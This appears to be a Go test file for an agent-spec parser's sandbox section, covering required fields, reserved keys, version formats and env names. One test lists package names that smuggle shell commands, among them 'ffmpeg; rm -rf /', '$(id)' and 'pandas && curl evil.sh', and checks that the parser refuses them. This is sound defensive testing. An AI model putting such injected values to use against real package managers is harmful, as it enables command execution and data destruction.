package spec

import (
	"strings"
	"testing"
)

func sandboxSpec(t *testing.T, sandbox string) (*AstroSpec, error) {
	t.Helper()
	return ParseSpecBytes([]byte(`spec: blueprint/v1
name: probe
agent:
  image: example/agent:1
` + sandbox))
}

func TestAnAgentWithoutASandboxSectionDeclaresNoSandbox(t *testing.T) {
	parsed, err := sandboxSpec(t, "")
	if err != nil {
		t.Fatal(err)
	}
	if parsed.Sandbox != nil {
		t.Error("a spec with no sandbox section parsed one anyway")
	}
}

func TestASandboxSectionParsesEveryField(t *testing.T) {
	parsed, err := sandboxSpec(t, `sandbox:
  toolchain: always
  packages: [ffmpeg, libpq-devel]
  python:
    version: "3.12"
    packages: [pandas]
  node:
    version: "22"
    packages: [typescript]
  env:
    PYTHONUNBUFFERED: "1"
  setup:
    - git clone https://example.com/seed.git .
`)
	if err != nil {
		t.Fatal(err)
	}
	s := parsed.Sandbox
	if s == nil {
		t.Fatal("the sandbox section did not parse")
	}
	if s.Toolchain != "always" {
		t.Errorf("toolchain is %q", s.Toolchain)
	}
	if len(s.Packages) != 2 || s.Packages[0] != "ffmpeg" {
		t.Errorf("packages are %v", s.Packages)
	}
	if s.Python == nil || s.Python.Version != "3.12" || len(s.Python.Packages) != 1 {
		t.Errorf("python is %+v", s.Python)
	}
	if s.Node == nil || s.Node.Version != "22" || len(s.Node.Packages) != 1 {
		t.Errorf("node is %+v", s.Node)
	}
	if s.Env["PYTHONUNBUFFERED"] != "1" {
		t.Errorf("env is %v", s.Env)
	}
	if len(s.Setup) != 1 {
		t.Errorf("setup is %v", s.Setup)
	}
}

func TestToolchainIsRequiredSoTheSectionIsNeverEmpty(t *testing.T) {
	// The section's presence is what tells the platform an agent wants a
	// sandbox, so an empty section would be a marker that says nothing.
	for name, sandbox := range map[string]string{
		"empty section":    "sandbox: {}",
		"other keys only":  "sandbox:\n  packages: [ffmpeg]\n",
		"explicitly empty": "sandbox:\n  toolchain: \"\"\n",
	} {
		t.Run(name, func(t *testing.T) {
			_, err := sandboxSpec(t, sandbox+"\n")
			if err == nil {
				t.Fatal("parsed without a toolchain")
			}
			if !strings.Contains(err.Error(), "sandbox.toolchain") {
				t.Errorf("the error does not name the field: %v", err)
			}
		})
	}
}

func TestAReservedSandboxKeyIsRefusedRatherThanIgnored(t *testing.T) {
	// yaml.Unmarshal drops an unknown key, so without the check these would
	// parse and silently do nothing.
	for _, key := range []string{"files", "classes", "size", "tools"} {
		t.Run(key, func(t *testing.T) {
			_, err := sandboxSpec(t, "sandbox:\n  toolchain: auto\n  "+key+": something\n")
			if err == nil {
				t.Fatalf("%s parsed, so a spec setting it would do nothing", key)
			}
			if !strings.Contains(err.Error(), "sandbox."+key) {
				t.Errorf("the error does not name the key: %v", err)
			}
		})
	}
}

func TestAPackageNameCarryingShellMetacharactersIsRefused(t *testing.T) {
	// The name reaches a package manager as an argument, so it is refused
	// rather than escaped.
	for name, sandbox := range map[string]string{
		"command substitution": "sandbox:\n  toolchain: auto\n  packages: [\"$(id)\"]\n",
		"separator":            "sandbox:\n  toolchain: auto\n  packages: [\"ffmpeg; rm -rf /\"]\n",
		"leading dash":         "sandbox:\n  toolchain: auto\n  packages: [\"--nogpgcheck\"]\n",
		"pypi":                 "sandbox:\n  toolchain: auto\n  python:\n    packages: [\"pandas && curl evil.sh\"]\n",
		"npm":                  "sandbox:\n  toolchain: auto\n  node:\n    packages: [\"`whoami`\"]\n",
	} {
		t.Run(name, func(t *testing.T) {
			if _, err := sandboxSpec(t, sandbox); err == nil {
				t.Fatal("parsed a package name that reaches a shell")
			}
		})
	}
}

func TestTheNamesRealEcosystemsUseAreAccepted(t *testing.T) {
	// An allow-list of characters refused all of these at one point: npm scopes
	// carry @ and /, PyPI extras carry brackets, and a version pin carries =.
	parsed, err := sandboxSpec(t, `sandbox:
  toolchain: auto
  packages: [python3.13, gcc-c++, libstdc++]
  python:
    packages: ["pandas==2.2.0", "uvicorn[standard]", "ruff>=0.5"]
  node:
    packages: ["@angular/cli", "typescript@5"]
`)
	if err != nil {
		t.Fatalf("a legitimate name was refused: %v", err)
	}
	if len(parsed.Sandbox.Packages) != 3 || len(parsed.Sandbox.Python.Packages) != 3 {
		t.Errorf("packages are %v and %v", parsed.Sandbox.Packages, parsed.Sandbox.Python.Packages)
	}
}

func TestAnInterpreterVersionMustLookLikeAVersion(t *testing.T) {
	cases := map[string]bool{
		"sandbox:\n  toolchain: auto\n  python:\n    version: \"3.12\"\n":   true,
		"sandbox:\n  toolchain: auto\n  python:\n    version: \"3\"\n":      false,
		"sandbox:\n  toolchain: auto\n  python:\n    version: \"latest\"\n": false,
		"sandbox:\n  toolchain: auto\n  node:\n    version: \"22\"\n":       true,
		"sandbox:\n  toolchain: auto\n  node:\n    version: \"22.1.0\"\n":   false,
		"sandbox:\n  toolchain: auto\n  node:\n    version: \"lts/iron\"\n": false,
	}
	for sandbox, want := range cases {
		_, err := sandboxSpec(t, sandbox)
		if want && err != nil {
			t.Errorf("%q was refused: %v", sandbox, err)
		}
		if !want && err == nil {
			t.Errorf("%q was accepted", sandbox)
		}
	}
}

func TestAnEnvKeyThatIsNotAnEnvKeyIsRefused(t *testing.T) {
	for _, key := range []string{"lower case", "has-dash", "1LEADING", "WITH.DOT"} {
		t.Run(key, func(t *testing.T) {
			_, err := sandboxSpec(t, "sandbox:\n  toolchain: auto\n  env:\n    \""+key+"\": value\n")
			if err == nil {
				t.Fatalf("%q parsed as an environment variable name", key)
			}
		})
	}
}

func TestAnEmptySetupCommandIsRefused(t *testing.T) {
	_, err := sandboxSpec(t, "sandbox:\n  toolchain: auto\n  setup: [\"make build\", \"   \"]\n")
	if err == nil {
		t.Fatal("an empty command parsed")
	}
	if !strings.Contains(err.Error(), "setup[1]") {
		t.Errorf("the error does not name the command: %v", err)
	}
}

func TestAToolchainModeOutsideTheSetIsRefused(t *testing.T) {
	_, err := sandboxSpec(t, "sandbox:\n  toolchain: maybe\n")
	if err == nil {
		t.Fatal("an unknown toolchain mode parsed")
	}
	if !strings.Contains(err.Error(), "auto, always, never") {
		t.Errorf("the error does not list the modes: %v", err)
	}
}
